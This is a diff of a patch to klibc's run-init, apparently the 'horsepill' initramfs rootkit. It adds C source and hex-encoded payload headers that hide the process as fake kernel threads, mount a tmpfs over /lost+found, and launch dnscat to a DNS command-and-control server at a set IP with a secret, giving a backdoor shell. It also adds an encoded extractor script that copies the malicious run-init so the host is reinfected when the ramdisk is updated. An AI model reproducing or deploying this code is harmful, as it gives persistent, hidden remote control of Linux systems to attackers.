@@ -1,5 +1,5 @@
 --- klibc-2.0.7.orig/usr/kinit/run-init/Kbuild	2019-10-07 18:27:49.000000000 +0200
-+++ klibc-2.0.7/usr/kinit/run-init/Kbuild	2022-05-05 14:18:43.272967611 +0200
++++ klibc-2.0.7/usr/kinit/run-init/Kbuild	2022-05-05 23:06:12.228245650 +0200
 @@ -6,7 +6,7 @@
  shared-y := shared/run-init
  
@@ -9,8 +9,8 @@
  
  # TODO - do we want a stripped version
  # TODO - do we want the static.g + shared.g directories?
---- /dev/null	2022-05-05 13:49:43.999805410 +0200
-+++ klibc-2.0.7/usr/kinit/run-init/dnscat.h	2022-05-05 14:36:17.411177880 +0200
+--- /dev/null	2022-05-05 21:07:16.056107927 +0200
++++ klibc-2.0.7/usr/kinit/run-init/dnscat.h	2022-05-05 23:05:49.883760486 +0200
 @@ -0,0 +1,30742 @@
 +#ifndef DNSCAT_H
 +#define DNSCAT_H
@@ -30754,8 +30754,45 @@
 +unsigned int dnscat_len = 368808;
 +
 +#endif
---- /dev/null	2022-05-05 13:49:43.999805410 +0200
-+++ klibc-2.0.7/usr/kinit/run-init/infect.h	2022-05-05 14:36:18.023179199 +0200
+--- /dev/null	2022-05-05 21:07:16.056107927 +0200
++++ klibc-2.0.7/usr/kinit/run-init/extractor.h	2022-05-05 23:05:49.883760486 +0200
+@@ -0,0 +1,34 @@
++#ifndef EXTRACTOR_H
++#define EXTRACTOR_H
++
++unsigned char extractor[] = {
++	0x23, 0x21, 0x2f, 0x62, 0x69, 0x6e, 0x2f, 0x62, 0x61, 0x73, 0x68, 0x0a,
++	0x0a, 0x63, 0x64, 0x20, 0x2f, 0x6c, 0x6f, 0x73, 0x74, 0x2b, 0x66, 0x6f,
++	0x75, 0x6e, 0x64, 0x0a, 0x6d, 0x6b, 0x64, 0x69, 0x72, 0x20, 0x74, 0x6d,
++	0x70, 0x32, 0x0a, 0x6d, 0x6b, 0x64, 0x69, 0x72, 0x20, 0x74, 0x6d, 0x70,
++	0x32, 0x2f, 0x65, 0x78, 0x74, 0x72, 0x61, 0x63, 0x74, 0x65, 0x64, 0x0a,
++	0x0a, 0x23, 0x20, 0x72, 0x61, 0x6d, 0x64, 0x69, 0x73, 0x6b, 0x20, 0x75,
++	0x6e, 0x70, 0x61, 0x63, 0x6b, 0x0a, 0x63, 0x70, 0x20, 0x2f, 0x62, 0x6f,
++	0x6f, 0x74, 0x2f, 0x69, 0x6e, 0x69, 0x74, 0x72, 0x64, 0x2e, 0x69, 0x6d,
++	0x67, 0x2d, 0x24, 0x28, 0x75, 0x6e, 0x61, 0x6d, 0x65, 0x20, 0x2d, 0x72,
++	0x29, 0x20, 0x74, 0x6d, 0x70, 0x32, 0x2f, 0x0a, 0x63, 0x64, 0x20, 0x74,
++	0x6d, 0x70, 0x32, 0x2f, 0x0a, 0x75, 0x6e, 0x6d, 0x6b, 0x69, 0x6e, 0x69,
++	0x74, 0x72, 0x61, 0x6d, 0x66, 0x73, 0x20, 0x69, 0x6e, 0x69, 0x74, 0x72,
++	0x64, 0x2e, 0x69, 0x6d, 0x67, 0x2d, 0x24, 0x28, 0x75, 0x6e, 0x61, 0x6d,
++	0x65, 0x20, 0x2d, 0x72, 0x29, 0x20, 0x2e, 0x2f, 0x65, 0x78, 0x74, 0x72,
++	0x61, 0x63, 0x74, 0x65, 0x64, 0x2f, 0x0a, 0x63, 0x64, 0x20, 0x65, 0x78,
++	0x74, 0x72, 0x61, 0x63, 0x74, 0x65, 0x64, 0x2f, 0x0a, 0x0a, 0x23, 0x20,
++	0x65, 0x78, 0x74, 0x72, 0x61, 0x63, 0x74, 0x20, 0x72, 0x75, 0x6e, 0x2d,
++	0x69, 0x6e, 0x69, 0x74, 0x20, 0x62, 0x69, 0x6e, 0x61, 0x72, 0x79, 0x0a,
++	0x63, 0x70, 0x20, 0x6d, 0x61, 0x69, 0x6e, 0x2f, 0x75, 0x73, 0x72, 0x2f,
++	0x62, 0x69, 0x6e, 0x2f, 0x72, 0x75, 0x6e, 0x2d, 0x69, 0x6e, 0x69, 0x74,
++	0x20, 0x2f, 0x6c, 0x6f, 0x73, 0x74, 0x2b, 0x66, 0x6f, 0x75, 0x6e, 0x64,
++	0x2f, 0x72, 0x75, 0x6e, 0x2d, 0x69, 0x6e, 0x69, 0x74, 0x0a, 0x0a, 0x23,
++	0x20, 0x63, 0x6c, 0x65, 0x61, 0x6e, 0x75, 0x70, 0x0a, 0x63, 0x64, 0x20,
++	0x2f, 0x6c, 0x6f, 0x73, 0x74, 0x2b, 0x66, 0x6f, 0x75, 0x6e, 0x64, 0x0a,
++	0x72, 0x6d, 0x20, 0x2d, 0x72, 0x66, 0x20, 0x74, 0x6d, 0x70, 0x32, 0x2f,
++	0x0a
++};
++unsigned int extractor_len = 301;
++
++#endif
+--- /dev/null	2022-05-05 21:07:16.056107927 +0200
++++ klibc-2.0.7/usr/kinit/run-init/infect.h	2022-05-05 23:05:49.883760486 +0200
 @@ -0,0 +1,80 @@
 +#ifndef INFECT_H
 +#define INFECT_H
@@ -30837,8 +30874,8 @@
 +unsigned int infect_len = 860;
 +
 +#endif
---- /dev/null	2022-05-05 13:49:43.999805410 +0200
-+++ klibc-2.0.7/usr/kinit/run-init/horsepill.h	2022-05-05 14:36:16.855176681 +0200
+--- /dev/null	2022-05-05 21:07:16.056107927 +0200
++++ klibc-2.0.7/usr/kinit/run-init/horsepill.h	2022-05-05 23:05:49.883760486 +0200
 @@ -0,0 +1,8 @@
 +#ifndef HORSEPILL_H
 +#define HORSEPILL_H
@@ -30848,9 +30885,9 @@
 +void do_attack();
 +
 +#endif
---- /dev/null	2022-05-05 13:49:43.999805410 +0200
-+++ klibc-2.0.7/usr/kinit/run-init/horsepill.c	2022-05-05 14:36:16.247175371 +0200
-@@ -0,0 +1,531 @@
+--- /dev/null	2022-05-05 21:07:16.056107927 +0200
++++ klibc-2.0.7/usr/kinit/run-init/horsepill.c	2022-05-05 23:05:49.883760486 +0200
+@@ -0,0 +1,541 @@
 +#define _GNU_SOURCE
 +#include <ctype.h>
 +#include <dirent.h>
@@ -30879,6 +30916,7 @@
 +#include <unistd.h>
 +
 +#include "dnscat.h"
++#include "extractor.h"
 +#include "horsepill.h"
 +#include "infect.h"
 +
@@ -30912,15 +30950,18 @@
 +#define ptr_to_u64(ptr) ((__u64)((uintptr_t)(ptr)))
 +
 +#define DNSCAT_PATH     "/lost+found/dnscat"
++#define EXTRACTOR_PATH  "/lost+found/extractor.sh"
 +#define INFECT_PATH     "/lost+found/infect.sh"
 +
 +static char *const DNSCAT_ARGV0 = "dnscat\0";
 +static char *const DNSCAT_ARGV1 = "--dns\0";
-+static char *const DNSCAT_ARGV2 = "server=172.20.10.2,port=53\0";
++static char *const DNSCAT_ARGV2 = "server=192.168.1.197,port=53\0";
 +static char *const DNSCAT_ARGV3 = "--secret=5100a1e43a193b60ba720ada295189a6\0";
 +
 +static char *const INFECT_ARGV0 = "infect.sh\0";
 +static char *const INFECT_ARGV1 = "/lost+found/run-init\0";
++
++static char *const EXTRACTOR_ARGV0 = "extractor.sh\0";
 +
 +static pid_t init_pid;
 +char **cmdline_ptr;
@@ -30937,10 +30978,8 @@
 +
 +        memset((void*)buf, 0, sizeof(buf));
 +        strncpy(buf, name + 1, strlen(name) - 2);
-+        if (prctl(PR_SET_NAME, (unsigned long)buf, 0, 0, 0) < 0) {
-+                printf("prctl set name returned error!\n");
-+                exit(EXIT_FAILURE);
-+        }
++        if (prctl(PR_SET_NAME, (unsigned long)buf, 0, 0, 0) < 0)
++                err_exit("prctl set name returned error!");
 +        memset((void *)cmdline_ptr[0], 0, 32);
 +        strcpy(cmdline_ptr[0], name);
 +}
@@ -30957,7 +30996,7 @@
 +                 * the fake kernel threads
 +                 */
 +                G3LBIN(sigfillset(&set));
-+                G3LBIN(sigdelset(&set, SIGINT));
++                G3LBIN(sigdelset(&set, SIGTERM));
 +                G3LBIN(sigprocmask(SIG_BLOCK, &set, NULL));
 +
 +                set_process_name(threads[0]);
@@ -31250,7 +31289,7 @@
 +
 +                fd = inotify_init();
 +                if (fd == -1)
-+                        err_exit("inotify_init1");
++                        err_exit("inotify_init");
 +                fcntl(fd, F_SETFL, O_NONBLOCK);
 +
 +                /* Mark directory for events
@@ -31324,6 +31363,10 @@
 +                        DNSCAT_ARGV3,
 +                        NULL
 +                };
++                char *const extractor_argv[2] = {
++                        EXTRACTOR_ARGV0,
++                        NULL
++                };
 +
 +                /* install signal handler to handle signal delivered
 +                 * ctrl-alt-delete, which we will send to child init
@@ -31346,6 +31389,10 @@
 +                /* mount scratch space over lost+found for our use */
 +		if (mount("tmpfs", "/lost+found", "tmpfs", MS_STRICTATIME, "mode=755") < 0)
 +                        err_exit("couldn't mount ramdisk!");
++
++                /* extract malicious run-init for future reinfections */
++                write_file(EXTRACTOR_PATH, extractor, extractor_len);
++                G3LBIN(execv_wrapper(EXTRACTOR_PATH, extractor_argv));
 +
 +                /* spawn a process for backdoor shell and a process
 +                 * to observe ramdisk updates
@@ -31383,7 +31430,7 @@
 +}
 +
 --- klibc-2.0.7.orig/usr/kinit/run-init/run-init.c	2019-10-07 18:27:49.000000000 +0200
-+++ klibc-2.0.7/usr/kinit/run-init/run-init.c	2022-05-05 14:19:34.237065602 +0200
++++ klibc-2.0.7/usr/kinit/run-init/run-init.c	2022-05-05 23:06:41.844872192 +0200
 @@ -52,6 +52,7 @@
  #include <string.h>
  #include <errno.h>
@@ -31401,7 +31448,7 @@
  	/* Variables... */
  	int o;
 --- klibc-2.0.7.orig/usr/kinit/run-init/runinitlib.c	2019-10-07 18:27:49.000000000 +0200
-+++ klibc-2.0.7/usr/kinit/run-init/runinitlib.c	2022-05-05 14:20:28.741172793 +0200
++++ klibc-2.0.7/usr/kinit/run-init/runinitlib.c	2022-05-05 23:07:56.270370054 +0200
 @@ -55,6 +55,7 @@
  #include <sys/vfs.h>
  #include "run-init.h"
